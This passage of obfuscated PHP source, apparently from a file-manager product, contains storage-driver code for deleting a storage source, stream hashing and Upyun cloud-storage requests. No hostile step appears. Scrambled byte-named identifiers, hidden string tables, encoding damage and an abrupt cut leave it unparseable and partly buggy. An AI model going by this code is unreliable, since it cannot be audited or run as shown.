$€®ò´÷£[$œ×áåÃ[6]] = json_decode($€®ò´÷£[$œ×áåÃ[6]], !0); } $™¬Åıåü[] = $€®ò´÷£; } return $™¬Åıåü; } public function defaultDriver() { $¤¤…’ =& $_SERVER[‘ÆÜ‘œ]; $ºİ¿ø = parent::listData(); $ëš›…ÌÙ = array_filter_by_field($ºİ¿ø, $¤¤…’[37], 1); $ëš›…ÌÙ = $ëš›…ÌÙ[0]; if (!$ëš›…ÌÙ) { return array(); } if (!is_array($ëš›…ÌÙ[$¤¤…’[6]])) { $ëš›…ÌÙ[$¤¤…’[6]] = json_decode($ëš›…ÌÙ[$¤¤…’[6]], !0); } return $ëš›…ÌÙ; } public function driverInfo($â±”Ó­Á) { $£ ƒşâÚ =& $_SERVER[‘ÆÜ‘œ]; $’š—‘ßê = array_to_keyvalue(parent::listData(), $£ ƒşâÚ[495]); if (!isset($’š—‘ßê[$â±”Ó­Á])) { return !1; } $Œà¾…ŞÉ = $’š—‘ßê[$â±”Ó­Á]; if (!is_array($Œà¾…ŞÉ[$£ ƒşâÚ[6]])) { $Œà¾…ŞÉ[$£ ƒşâÚ[6]] = json_decode($Œà¾…ŞÉ[$£ ƒşâÚ[6]], !0); } return $Œà¾…ŞÉ; } public function remove($ ¤ûÀøİ) { $this->removeShareItems($ ¤ûÀøİ); return parent::remove($ ¤ûÀøİ); } public function removeWithFile($«Î¸Ğ¢, $æîüï°”, $¢úäáàü, $Ø‚ëùœâ = false) { $…Ç«í•Ï =& $_SERVER[‘ÆÜ‘œ]; ignore_timeout(); $á–Å¢íé = array($…Ç«í•Ï[932] => $«Î¸Ğ¢); $îÆñçõÉ = Model($…Ç«í•Ï[568]); if (isset($GLOBALS[$…Ç«í•Ï[2489]])) { $‰‡’âöÅ = $GLOBALS[$…Ç«í•Ï[2489]]; } else { $‰‡’âöÅ = $îÆñçõÉ->where($á–Å¢íé)->field(array($…Ç«í•Ï[2387] => $…Ç«í•Ï[2092], $…Ç«í•Ï[2461] => $…Ç«í•Ï[79]))->find(); } $˜ÈÀ§¥Ã = intval($‰‡’âöÅ[$…Ç«í•Ï[2092]]); $Ó‚ÙŞçú = intval($‰‡’âöÅ[$…Ç«í•Ï[79]]); $ïàÜÕ¦  = $æîüï°” . $…Ç«í•Ï[2490] . $«Î¸Ğ¢; $í¬•¡öÂ = LNG($æîüï°” == $…Ç«í•Ï[651] ? $…Ç«í•Ï[2491] : $…Ç«í•Ï[2492]); $Ø­‹»¦› = new TaskFileTransfer($ïàÜÕ¦ , $…Ç«í•Ï[214], $˜ÈÀ§¥Ã, $í¬•¡öÂ . $…Ç«í•Ï[485] . $¢úäáàü[$…Ç«í•Ï[32]] . $…Ç«í•Ï[213] . $«Î¸Ğ¢); $Ø­‹»¦›->task[$…Ç«í•Ï[871]] = (double) $Ó‚ÙŞçú; $¸úüˆŞê = KodIO::defaultDriver(); $ó²È ¸ = $¸úüˆŞê[$…Ç«í•Ï[495]]; $×˜ù = 1; $ÜË»ü¹í = 5000; $Æ‘£íÆÛ = $ú³­á´¡ = $‘Öæœ˜ = array(); $¶…˜ˆ­ç = $îÆñçõÉ->where($á–Å¢íé)->field($…Ç«í•Ï[2493])->selectPage($ÜË»ü¹í, $×˜ù); $ï–¤üŞå = intval($¶…˜ˆ­ç[$…Ç«í•Ï[452]][$…Ç«í•Ï[454]]); while ($¶…˜ˆ­ç && $×˜ù <= $ï–¤üŞå) { foreach ($¶…˜ˆ­ç[$…Ç«í•Ï[455]] as $©¼Ûîı‰) { $°¬”Âµƒ = $©¼Ûîı‰[$…Ç«í•Ï[565]]; if ($Ø‚ëùœâ) { $ú³­á´¡[] = $°¬”Âµƒ; continue; } $õ¬ºôÛ­ = $©¼Ûîı‰[$…Ç«í•Ï[87]]; $¼‹ı¼õ = get_path_father($õ¬ºôÛ­); $‘Öæœ˜[] = $¼‹ı¼õ; $¼‹ı¼õ = str_replace("\173\x69\157\x3a{$«Î¸Ğ¢}\x7d\x2f", "\173\151\157\x3a{$ó²È ¸}\x7d\x2f", $¼‹ı¼õ); if (!IO::exist($õ¬ºôÛ­)) { $Æ‘£íÆÛ[] = $°¬”Âµƒ; $Ø­‹»¦›->updateFileEnd($©¼Ûîı‰[$…Ç«í•Ï[32]], $©¼Ûîı‰[$…Ç«í•Ï[79]]); write_log($…Ç«í•Ï[2494] . $õ¬ºôÛ­, $…Ç«í•Ï[2071]); continue; } $ì¯Ä§ = IO::move($õ¬ºôÛ­, $¼‹ı¼õ, REPEAT_RENAME); if (!$ì¯Ä§) { $ú³­á´¡[] = $°¬”Âµƒ; $Ø­‹»¦›->updateFileEnd($©¼Ûîı‰[$…Ç«í•Ï[32]], $©¼Ûîı‰[$…Ç«í•Ï[79]]); write_log($…Ç«í•Ï[2495] . $õ¬ºôÛ­, $…Ç«í•Ï[2071]); continue; } $ô¦øÈ…¦ = array($…Ç«í•Ï[932] => $ó²È ¸, $…Ç«í•Ï[87] => $ì¯Ä§); $îÆñçõÉ->where(array($…Ç«í•Ï[565] => $°¬”Âµƒ))->save($ô¦øÈ…¦); } $×˜ù++; $¶…˜ˆ­ç = $îÆñçõÉ->where($á–Å¢íé)->field($…Ç«í•Ï[2493])->selectPage($ÜË»ü¹í, $×˜ù); } $õëÀá” = $Ø­‹»¦›->task; if (!$Ø‚ëùœâ) { Cache::set($ïàÜÕ¦ , $õëÀá”); } $Ø­‹»¦›->end(); $Æ‘£íÆÛ = array_unique($Æ‘£íÆÛ); $ú³­á´¡ = array_unique($ú³­á´¡); if (!$Ø‚ëùœâ && ($Æ‘£íÆÛ || $ú³­á´¡)) { $”×±ŒØå = array(); if ($Æ‘£íÆÛ) { $”×±ŒØå[] = sprintf(LNG($…Ç«í•Ï[2496]), count($Æ‘£íÆÛ)); } if ($ú³­á´¡) { $”×±ŒØå[] = sprintf(LNG($…Ç«í•Ï[2497]), count($ú³­á´¡)); } $”×±ŒØå = sprintf(LNG($…Ç«í•Ï[2498]), implode($…Ç«í•Ï[1538], $”×±ŒØå)) . $…Ç«í•Ï[2499] . date($…Ç«í•Ï[2500]) . $…Ç«í•Ï[2501]; if ($æîüï°” == $…Ç«í•Ï[1282]) { $”×±ŒØå .= $…Ç«í•Ï[2502] . LNG($…Ç«í•Ï[2503]); } else { $”×±ŒØå = LNG($…Ç«í•Ï[2504]) . $…Ç«í•Ï[2505] . $”×±ŒØå; } $õëÀá”[$…Ç«í•Ï[1319]] = $”×±ŒØå; Cache::set($ïàÜÕ¦ , $õëÀá”); unset($¢úäáàü[$…Ç«í•Ï[6]]); $î›Ü®Û† = array($…Ç«í•Ï[495] => $«Î¸Ğ¢, $…Ç«í•Ï[2376] => $…Ç«í•Ï[651], $…Ç«í•Ï[32] => $¢úäáàü[$…Ç«í•Ï[32]], $…Ç«í•Ï[96] => $¢úäáàü[$…Ç«í•Ï[96]]); Hook::trigger($…Ç«í•Ï[1940], array($…Ç«í•Ï[1341] => $î›Ü®Û†, $…Ç«í•Ï[1351] => !0)); show_json($”×±ŒØå, !1, 100111); } if ($æîüï°” == $…Ç«í•Ï[651]) { return !0; } if ($Æ‘£íÆÛ || $ú³­á´¡) { $»äó‹ä¹ = array_merge($Æ‘£íÆÛ, $ú³­á´¡); $»äó‹ä¹ = array_filter(array_unique($»äó‹ä¹)); $this->removeByFileID($»äó‹ä¹); } if ($‘Öæœ˜) { $‘Öæœ˜ = array_filter(array_unique($‘Öæœ˜)); foreach ($‘Öæœ˜ as $õ¬ºôÛ­) { $‰‡’âöÅ = IO::has($õ¬ºôÛ­, !0); if (!$‰‡’âöÅ[$…Ç«í•Ï[240]] && !$‰‡’âöÅ[$…Ç«í•Ï[241]]) { IO::remove($õ¬ºôÛ­); } } } return $this->remove($«Î¸Ğ¢); } private function removeByFileID($­³ôõ€Æ = array()) { $ÏôÎ¤ … =& $_SERVER[‘ÆÜ‘œ]; if (empty($­³ôõ€Æ)) { return; } $¹†ø©¹¬ = array($ÏôÎ¤ …[565] => array($ÏôÎ¤ …[7], $­³ôõ€Æ)); $¦ŒŠ·„á = Model($ÏôÎ¤ …[1484])->where($¹†ø©¹¬)->field($ÏôÎ¤ …[2450])->select(); if (!$¦ŒŠ·„á) { return Model($ÏôÎ¤ …[568])->remove($­³ôõ€Æ); } $¦ŒŠ·„á = array_to_keyvalue($¦ŒŠ·„á, $ÏôÎ¤ …[192], $ÏôÎ¤ …[565]); foreach ($¦ŒŠ·„á as $ªåÕà÷Â => $”¶ôšÖ€) { Model($ÏôÎ¤ …[939])->removeNow($ªåÕà÷Â, !1); } $íáşÁß´ = array_diff($­³ôõ€Æ, array_unique(array_values($¦ŒŠ·„á))); if ($íáşÁß´) { return Model($ÏôÎ¤ …[568])->remove($íáşÁß´); } } private function removeShareItems($€¬ßçš) { $‘¿î€ºá =& $_SERVER[‘ÆÜ‘œ]; $†Õ¦ø™å = "\173\x69\x6f\72{$€¬ßçš}\175\57"; $­–³Ô¨ = array($‘¿î€ºá[192] => 0, $‘¿î€ºá[591] => array($‘¿î€ºá[482], "{$†Õ¦ø™å}\x25")); $³‚¶Ãè¥ = Model($‘¿î€ºá[1514])->where($­–³Ô¨)->field($‘¿î€ºá[695])->select(); if (empty($³‚¶Ãè¥)) { return; } $™Ğñû±³ = array_to_keyvalue($³‚¶Ãè¥, $‘¿î€ºá[12], $‘¿î€ºá[695]); Model($‘¿î€ºá[694])->remove($™Ğñû±³); } } goto EèŸ­“Š¬ˆ; AÜíôÏø¶‡: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ãèö×¨, $¿¶¢ùµ = 0) { parent::__construct(); $this->source = $ãèö×¨; $this->sourceSize = $¿¶¢ùµ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($èÕñÕŞÔ = false) { return $this->sourceSize; } public function getContent($†÷èßÏˆ = false) { return $this->fileSubstr($†÷èßÏˆ, 0, $this->sourceSize); } public function fileSubstr($¸ŒÈâöÃ = false, $²Õ¼ —ù = 0, $®ı‘Âàè = 0) { if (!$®ı‘Âàè) { $®ı‘Âàè = $this->sourceSize; } $–Ó”åà´ = $this->sourceSize - $²Õ¼ —ù; if ($®ı‘Âàè >= $–Ó”åà´) { $®ı‘Âàè = $–Ó”åà´; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $²Õ¼ —ù, $®ı‘Âàè); } if ($this->sourceType == self::TYPE_FILE) { if ($®ı‘Âàè <= 0) { return $_SERVER[‘ÆÜ‘œ][12]; } $½Ä¶Ã‹ = ftell($this->source); fseek_64($this->source, $½Ä¶Ã‹ + $²Õ¼ —ù); $æâ½¿ñ = @fread($this->source, $®ı‘Âàè); fseek_64($this->source, $½Ä¶Ã‹); return $æâ½¿ñ; } } public function hashMd5($¯Şş€’¤ = false) { return md5($this->getContent()); } public static function hash($˜çâê©¬, $‘öşÔ¸ = 0) { $ƒã¶ò– = new PathDriverStream($˜çâê©¬, $‘öşÔ¸); return $ƒã¶ò–->hashSimple($˜çâê©¬); } public static function md5($ğß•ºª±, $Èãş¨¾Ÿ = 0) { $é„½Äô£ = new PathDriverStream($ğß•ºª±, $Èãş¨¾Ÿ); return $é„½Äô£->hashMd5($ğß•ºª±); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\x2f\x2f\166\x30\x2e\141\x70\x69\x2e\165\160\x79\165\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ıŠ¤À) { parent::__construct(); $this->_init($ıŠ¤À); } public function _init($‹ØåùÙ ) { $Ş—ô×ğ =& $_SERVER[‘ÆÜ‘œ]; foreach ($‹ØåùÙ  as $ª…˜ÄÖé => $†ØœçŸ£) { if (isset($this->{$ª…˜ÄÖé})) { $this->{$ª…˜ÄÖé} = $†ØœçŸ£; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ş—ô×ğ[1701] . LNG($Ş—ô×ğ[1623])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÖÁ¥ËŸ‡, $–çç = "\107\105\x54") { $ñ˜…Ôƒé =& $_SERVER[‘ÆÜ‘œ]; $ëøÍ²ıê = gmdate($ñ˜…Ôƒé[1652]); $²”Èïó = base64_encode(hash_hmac($ñ˜…Ôƒé[1702], "{$–çç}\x26{$ÖÁ¥ËŸ‡}\x26{$ëøÍ²ıê}", md5("{$this->userpass}"), !0)); $§±±ÂŸ = array("\101\x75\164\x68\x6f\162\x69\172\x61\164\151\x6f\156\72\x55\x50\131\x55\x4e\x20{$this->username}\72{$²”Èïó}", "\x44\141\x74\145\72{$ëøÍ²ıê}"); return $§±±ÂŸ; } public function ussRequest($í‹©†Õ, $úŠ‰´ÎÅ = "\x47\x45\x54", $ëÛ×ØÌ = false, $Î®ÖŞàÔ = false, $öëÂà»× = false) { $êæ±§ØĞ =& $_SERVER[‘ÆÜ‘œ]; $í‹©†Õ = trim($í‹©†Õ, $êæ±§ØĞ[8]); $§Ì¸ü‡ı = "\x2f{$this->bucket}\x2f" . rawurlencode($í‹©†Õ); $Óñôá‹¶ = $this->ussHeaders($§Ì¸ü‡ı, $úŠ‰´ÎÅ); if ($Î®ÖŞàÔ) { $Óñôá‹¶ = array_merge($Óñôá‹¶, $Î®ÖŞàÔ); } $Í·šğîé = url_request($this->endpoint . $§Ì¸ü‡ı, $úŠ‰´ÎÅ, $ëÛ×ØÌ, $Óñôá‹¶, $öëÂà»×); if (!$Í·šğîé) { $¾¦£¶Ç = LNG($êæ±§ØĞ[1703]); $this->writeLog($¾¦£¶Ç); return array($êæ±§ØĞ[1351] => !1, $êæ±§ØĞ[1341] => $¾¦£¶Ç); } if (strtolower($úŠ‰´ÎÅ) == $êæ±§ØĞ[228] || in_array($Í·šğîé[$êæ±§ØĞ[1351]], array($êæ±§ØĞ[262], $êæ±§ØĞ[1704]))) { $ëÛ×ØÌ = $Í·šğîé[$êæ±§ØĞ[1705]]; if (!$Í·šğîé[$êæ±§ØĞ[857]]) { $ëÛ×ØÌ = isset($ëÛ×ØÌ[0]) ? $ëÛ×ØÌ[0] : $êæ±§ØĞ[12]; } } else { $ëÛ×ØÌ = json_decode($Í·šğîé[$êæ±§ØĞ[1341]], !0); if (!$ëÛ×ØÌ) { $ëÛ×ØÌ = $Í·šğîé[$êæ±§ØĞ[1341]]; } else { if (!$Í·šğîé[$êæ±§ØĞ[857]] && isset($ëÛ×ØÌ[$êæ±§ØĞ[1706]])) { $ëÛ×ØÌ = $ëÛ×ØÌ[$êæ±§ØĞ[1706]]; } } } if (!$Í·šğîé[$êæ±§ØĞ[857]]) { $this->writeLog($this->__errorMessage($ëÛ×ØÌ)); } return array($êæ±§ØĞ[1351] => $Í·šğîé[$êæ±§ØĞ[857]], $êæ±§ØĞ[1341] => $ëÛ×ØÌ); } private function __errorMessage($´‰µ¥æ) { $Ááóô  =& $_SERVER[‘ÆÜ‘œ]; if (!$´‰µ¥æ) { return $Ááóô [12]; } static $ßôàÙ = null; if (!$ßôàÙ) { $ßôàÙ = I18n::getType(); } if ($ßôàÙ != $Ááóô [1660]) { return $´‰µ¥æ; } $ Æ°±¾« = array($Ááóô [1707] => $Ááóô [1708], $Ááóô [1709] => $Ááóô [1710], $Ááóô [1711] => $Ááóô [1710], $Ááóô [1712] => $Ááóô [1713], $Ááóô [1714] => $Ááóô [1715], $Ááóô [1716] => $Ááóô [1717], $Ááóô [1718] => $Ááóô [1719]); return isset($ Æ°±¾«[$´‰µ¥æ]) ? $ Æ°±¾«[$´‰µ¥æ] : $´‰µ¥æ; } public function mkfile($ÚŒÖÜ±è, $òô¨Ì÷ö = '', $ë¬í«ç = REPEAT_RENAME) { if ($this->setContent($ÚŒÖÜ±è, $òô¨Ì÷ö)) { return $this->getPathOuter($ÚŒÖÜ±è); } return !1; } public function mkdir($æ‰áúË¸, $İª¸ã¿” = REPEAT_SKIP) { $É‡«µ =& $_SERVER[‘ÆÜ‘œ]; $ıÃöºÚ¶ = trim($æ‰áúË¸, $É‡«µ[8]); if ($this->_isFolder($ıÃöºÚ¶)) { return $this->getPathOuter($ıÃöºÚ¶); } $¸Šå´Š = array($É‡«µ[1720]); $ôÇË™Üã = $this->ussRequest($ıÃöºÚ¶, $É‡«µ[289], !1, $¸Šå´Š); return $ôÇË™Üã[$É‡«µ[1351]] ? $this->getPathOuter($ıÃöºÚ¶) : !1; } public function copyFile($¨ô‰ú , $˜Ğ’‹¸) { $ƒÄê ×Œ =& $_SERVER[‘ÆÜ‘œ]; $ÜÏ“…Åº = array($ƒÄê ×Œ[1721] . "\x2f{$this->bucket}\57{$¨ô‰ú }", $ƒÄê ×Œ[1722]); $ˆ¡Ì¿‡ = $this->ussRequest($˜Ğ’‹¸, $ƒÄê ×Œ[254], !1, $ÜÏ“…Åº); return $ˆ¡Ì¿‡[$ƒÄê ×Œ[1351]] ? !0 : $this->getPathOuter($˜Ğ’‹¸); } public function moveFile($õ Ä¤¬, $‰¥¶Éù) { $úİ«ğ¢  =& $_SERVER[‘ÆÜ‘œ]; $îááïô¬ = array($úİ«ğ¢ [1723] . "\57{$this->bucket}\x2f{$õ Ä¤¬}", $úİ«ğ¢ [1722]); $×§İÉœ = $this->ussRequest($‰¥¶Éù, $úİ«ğ¢ [254], !1, $îááïô¬); return $×§İÉœ[$úİ«ğ¢ [1351]] ? !0 : $this->getPathOuter($‰¥¶Éù); } public function delFile($àê•ëûÅ) { $½ˆî£ =& $_SERVER[‘ÆÜ‘œ]; $––ñòê = $this->ussRequest($àê•ëûÅ, $½ˆî£[1724]); return $––ñòê[$½ˆî£[1351]] ? !0 : !1; } public function delFolder($ˆóÕ…ƒ) { $ÎŒúÙÔï =& $_SERVER[‘ÆÜ‘œ]; if (!$this->exist($ˆóÕ…ƒ)) { return !0; } $this->listItemCache = !1; $™û•µá¤ = $£„®Ìà€ = array(); $this->fileList($ˆóÕ…ƒ, $™û•µá¤, $£„®Ìà€, !0); $this->listItemCache = !0; foreach ($£„®Ìà€ as $¥…®Ñƒ) { $éÉ¥‘Ğ = $this->ussRequest($¥…®Ñƒ[$ÎŒúÙÔï[32]], $ÎŒúÙÔï[1724]); if (!$éÉ¥‘Ğ[$ÎŒúÙÔï[1351]]) { return !1; } } usort($™û•µá¤, function ($™¨Å¸Œ, $»ñå£òÂ) { $ùÕ¥êËã =& $_SERVER[‘ÆÜ‘œ]; return substr_count($»ñå£òÂ, $ùÕ¥êËã[8]) - substr_count($™¨Å¸Œ, $ùÕ¥êËã[8]); }); foreach ($™û•µá¤ as $äúÈ¬¸Õ) { $éÉ¥‘Ğ = $this->ussRequest($äúÈ¬¸Õ, $ÎŒúÙÔï[1724]); if (!$éÉ¥‘Ğ[$ÎŒúÙÔï[1351]]) { return !1; } } $éÉ¥‘Ğ = $this->ussRequest($ˆóÕ…ƒ, $ÎŒúÙÔï[1724]); return $éÉ¥‘Ğ[$ÎŒúÙÔï[1351]]; } public function rename($„Ú‰¸©Í, $ÛÉŸŞëì) { if ($this->isFile($„Ú‰¸©Í)) { $ÛÉŸŞëì = get_path_father($„Ú‰¸©Í) . $ÛÉŸŞëì; return $this->moveFile($„Ú‰¸©Í, $ÛÉŸŞëì); } return $this->renameObject($„Ú‰¸©Í, $ÛÉŸŞëì); } public function fileInfo($¶Âİ¯€¾, $ñ‚«¶™¦ = false, $éü«›¹© = array()) { $°“ƒ±Ç =& $_SERVER[‘ÆÜ‘œ]; $‹ÏØéÓÔ = array($°“ƒ±Ç[32] => $this->pathThis($¶Âİ¯€¾), $°“ƒ±Ç[87] => $this->getPathOuter($°“ƒ±Ç[8] . $¶Âİ¯€¾), $°“ƒ±Ç[33] => $°“ƒ±Ç[231], $°“ƒ±Ç[79] => isset($éü«›¹©[$°“ƒ±Ç[79]]) ? $éü«›¹©[$°“ƒ±Ç[79]] : 0, $°“ƒ±Ç[167] => $this->ext($¶Âİ¯€¾)); if ($ñ‚«¶™¦) { return $‹ÏØéÓÔ; } $‹ÏØéÓÔ[$°“ƒ±Ç[232]] = $‹ÏØéÓÔ[$°“ƒ±Ç[88]] = 0; $‹ÏØéÓÔ[$°“ƒ±Ç[233]] = $‹ÏØéÓÔ[$°“ƒ±Ç[234]] = !0; if (empty($éü«›¹©)) { $éü«›¹© = $this->objectMeta($¶Âİ¯€¾); if (!$éü«›¹©) { return $‹ÏØéÓÔ; } } $‹ÏØéÓÔ[$°“ƒ±Ç[232]] = intval($éü«›¹©[$°“ƒ±Ç[1725]]); $‹ÏØéÓÔ[$°“ƒ±Ç[88]] = intval($éü«›¹©[$°“ƒ±Ç[1726]]); $‹ÏØéÓÔ[$°“ƒ±Ç[79]] = $éü«›¹©[$°“ƒ±Ç[79]]; return $‹ÏØéÓÔ; } public function folderInfo($§Şßèµú, $¶Î’° = false) { $Çšëá–ç =& $_SERVER[‘ÆÜ‘œ]; $™ÇŸÃôÜ = array($Çšëá–ç[32] => $this->pathThis($§Şßèµú), $Çšëá–ç[87] => $this->getPathOuter($Çšëá–ç[8] . $§Şßèµú), $Çšëá–ç[33] => $Çšëá–ç[78]); if ($¶Î’°) { return $™ÇŸÃôÜ; } $™ÇŸÃôÜ[$Çšëá–ç[232]] = $™ÇŸÃôÜ[$Çšëá–ç[88]] = 0; $™ÇŸÃôÜ[$Çšëá–ç[233]] = $™ÇŸÃôÜ[$Çšëá–ç[234]] = !0; if (empty($Êµ·îÖ)) { $Êµ·îÖ = $this->objectMeta($§Şßèµú); if (!$Êµ·îÖ) { return $™ÇŸÃôÜ; } } $™ÇŸÃôÜ[$Çšëá–ç[232]] = intval($Êµ·îÖ[$Çšëá–ç[1725]]); $™ÇŸÃôÜ[$Çšëá–ç[88]] = intval($Êµ·îÖ[$Çšëá–ç[1726]]); return $™ÇŸÃôÜ; } private function listObjs($ü³•½å, $ığÅß¸° = 0, $„´Ïôûü = 1000) { $¿‹ù”Ã =& $_SERVER[‘ÆÜ‘œ]; $İâ¹“©ì = array($¿‹ù”Ã[1727], $¿‹ù”Ã[1728] . $„´Ïôûü); if ($ığÅß¸°) { $İâ¹“©ì[] = $¿‹ù”Ã[1729] . $ığÅß¸°; } $ãŠÌµ¼ = $this->ussRequest($ü³•½å, $¿‹ù”Ã[1557], !1, $İâ¹“©ì); return !$ãŠÌµ¼[$¿‹ù”Ã[1351]] ? !1 : $ãŠÌµ¼[$¿‹ù”Ã[1341]]; } private function fileList($¿ÌäìÈÎ, &$ÕŠ’úñü, &$–ıÛˆÇ, $ùéùÆ ¢ = false) { $œÈãÎ¥† =& $_SERVER[‘ÆÜ‘œ]; $Ã°ÕŸ¾ı = $œÈãÎ¥†[12]; $³»“Ô·× = 1000; $Ê„˜òœá = rtrim($¿ÌäìÈÎ, $œÈãÎ¥†[8]) . $œÈãÎ¥†[8]; while (!0) { check_abort(); $»°¢ÍÂ¶ = $this->listObjs($¿ÌäìÈÎ, $Ã°ÕŸ¾ı, $³»“Ô·×); if (!$»°¢ÍÂ¶) { return !1; } $Ã°ÕŸ¾ı = isset($»°¢ÍÂ¶[$œÈãÎ¥†[1730]]) ? $»°¢ÍÂ¶[$œÈãÎ¥†[1730]] : $œÈãÎ¥†[12]; $ƒ¹ôïæ = isset($»°¢ÍÂ¶[$œÈãÎ¥†[1731]]) ? $»°¢ÍÂ¶[$œÈãÎ¥†[1731]] : array(); foreach ($ƒ¹ôïæ as $¯¹Éµ»ô) { $Ë¹’€·Æ = $¯¹Éµ»ô[$œÈãÎ¥†[33]] == $œÈãÎ¥†[78] ? !0 : !1; $—É¬âÂ = ltrim($Ê„˜òœá . $¯¹Éµ»ô[$œÈãÎ¥†[32]], $œÈãÎ¥†[8]) . ($Ë¹’€·Æ ? $œÈãÎ¥†[8] : $œÈãÎ¥†[12]); $ƒ‹õª£³ = array($œÈãÎ¥†[32] => $—É¬âÂ, $œÈãÎ¥†[33] => $Ë¹’€·Æ ? $œÈãÎ¥†[78] : $œÈãÎ¥†[231], $œÈãÎ¥†[79] => $¯¹Éµ»ô[$œÈãÎ¥†[422]], $œÈãÎ¥†[1726] => $¯¹Éµ»ô[$œÈãÎ¥†[1732]]); $this->cacheMethodInfoSet($—É¬âÂ, $Ë¹’€·Æ, $ƒ‹õª£³); if ($Ë¹’€·Æ) { $ÕŠ’úñü[] = $—É¬âÂ; if ($ùéùÆ ¢) { $this->fileList($—É¬âÂ, $ÕŠ’úñü, $–ıÛˆÇ, $ùéùÆ ¢); } continue; } $–ıÛˆÇ[] = $ƒ‹õª£³; } if (count($ƒ¹ôïæ) < $³»“Ô·×) { break; } } $this->cacheMethodInfoSet($¿ÌäìÈÎ, !0); } public function listPath($î†÷ø¾æ, $Ó×ˆ°ğ = false) { $º¾ó°¬ =& $_SERVER[‘ÆÜ‘œ]; $ÜáÚÌ—Ô = $ã«ÜšÃØ = array(); $this->fileList($î†÷ø¾æ, $ÜáÚÌ—Ô, $ã«ÜšÃØ); foreach ($ÜáÚÌ—Ô as $ª‚©Üñ— => $É®‚Ïüı) { $ÜáÚÌ—Ô[$ª‚©Üñ—] = $this->folderInfo($É®‚Ïüı, $Ó×ˆ°ğ); } foreach ($ã«ÜšÃØ as $ª‚©Üñ— => $É®‚Ïüı) { $ã«ÜšÃØ[$ª‚©Üñ—] = $this->fileInfo($É®‚Ïüı[$º¾ó°¬[32]], $Ó×ˆ°ğ, $É®‚Ïüı); } return array($º¾ó°¬[85] => $ÜáÚÌ—Ô, $º¾ó°¬[86] => $ã«ÜšÃØ); } public function has($²œ–Ê¾, $¥ƒƒòî­ = false, $¤Â £ú = true) { $åÇ¥–õ¿ =& $_SERVER[‘ÆÜ‘œ]; $×³–’ = $åÇ¥–õ¿[12]; $ä†ŒŞ™’ = 500; $ÀÖ€˜ˆò = 0; $çéï½†† = 0; $Œ¨‰ıèà = rtrim($²œ–Ê¾, $åÇ¥–õ¿[8]) . $åÇ¥–õ¿[8]; while (!0) { check_abort(); $Ô‘ƒ€„ = $this->listObjs($²œ–Ê¾, $×³–’, $ä†ŒŞ™’); if (!$Ô‘ƒ€„) { return !1; } $×³–’ = isset($Ô‘ƒ€„[$åÇ¥–õ¿[1730]]) ? $Ô‘ƒ€„[$åÇ¥–õ¿[1730]] : $åÇ¥–õ¿[12]; $æ¾Ñ–ó = isset($Ô‘ƒ€„[$åÇ¥–õ¿[1731]]) ? $Ô‘ƒ€„[$åÇ¥–õ¿[1731]] : array(); if (empty($æ¾Ñ–ó)) { break; } $©ê²Öß = array_filter($æ¾Ñ–ó, function ($­ÍÜçÖª) { $™Š³À =& $_SERVER[‘ÆÜ‘œ]; return $­ÍÜçÖª[$™Š³À[33]] == $™Š³À[78]; }); $¯òƒñØÎ = count($æ¾Ñ–ó); $©ê²Öß = count($©ê²Öß); $òâçúüñ = $¯òƒñØÎ - $©ê²Öß; if ($¥ƒƒòî­) { $çéï½†† += $©ê²Öß; $ÀÖ€˜ˆò += $òâçúüñ; if ($¯òƒñØÎ < $ä†ŒŞ™’) { break; } continue; } if ($¤Â £ú) { if ($òâçúüñ) { return !0; } } else { if ($©ê²Öß) { return !0; } } if ($¯òƒñØÎ < $ä†ŒŞ™’) { break; } } if ($¥ƒƒòî­) { return array($åÇ¥–õ¿[240] => $ÀÖ€˜ˆò, $åÇ¥–õ¿[241] => $çéï½††); } return !1; } public function listAll($œ’’ï•Ã) { $¥‡ãÔ¥ò =& $_SERVER[‘ÆÜ‘œ]; $ÊùØÍ  = $ıÙúà¬ = array(); $this->fileList($œ’’ï•Ã, $ÊùØÍ , $ıÙúà¬, !0); $Ş†ƒë¯ = array_to_keyvalue($ıÙúà¬, $¥‡ãÔ¥ò[32]); foreach ($ÊùØÍ  as $ßÔšÏ„Ù) { if (is_string($ßÔšÏ„Ù)) { $Ş†ƒë¯[$ßÔšÏ„Ù] = array($¥‡ãÔ¥ò[79] => 0); } } return $this->listAllFiles($œ’’ï•Ã, $Ş†ƒë¯); } public function canRead($¹Òäñ€ˆ) { return $this->exist($¹Òäñ€ˆ) ? !0 : !1; } public function canWrite($ÜƒÈ¥Ÿ‰) { return $this->exist($ÜƒÈ¥Ÿ‰) ? !0 : !1; } public function getContent($Í»ÌÂüğ) { return $this->fileSubstr($Í»ÌÂüğ, 0, -1); } public function setContent($€ÌŒ å, $·°Ë£¤¡ = '') { $‚ŒùôÁı =& $_SERVER[‘ÆÜ‘œ]; if (!$·°Ë£¤¡) { $÷¡³¹”î = $this->ussRequest($€ÌŒ å, $‚ŒùôÁı[289]); return $÷¡³¹”î[$‚ŒùôÁı[1351]]; } $‡Ì„ˆÒÖ = $this->tempFile($this->pathThis($€ÌŒ å)); file_put_contents($‡Ì„ˆÒÖ, $·°Ë£¤¡); if ($this->upload($€ÌŒ å, $‡Ì„ˆÒÖ)) { $this->tempFileRemve($‡Ì„ˆÒÖ); return !0; } return !1; } public function fileSubstr($™•†Ç¯„, $À†–ÜÕõ, $»şø …Ò) { $µÚÖÜ¹ =& $_SERVER[‘ÆÜ‘œ]; if (!($ˆÏØëÓŒ = $this->link($™•†Ç¯„))) { return !1; } $Å§×¹åÄ = !1; if ($»şø …Ò > 0) { $ˆ‚·Ä°ª = $À†–ÜÕõ + $»şø …Ò - 1; $Å§×¹åÄ = array($µÚÖÜ¹[1556] . $À†–ÜÕõ . $µÚÖÜ¹[485] . $ˆ‚·Ä°ª); } $ÄŸã—¼² = url_request($ˆÏØëÓŒ, $µÚÖÜ¹[1557], !1, $Å§×¹åÄ); return $ÄŸã—¼²[$µÚÖÜ¹[857]] ? 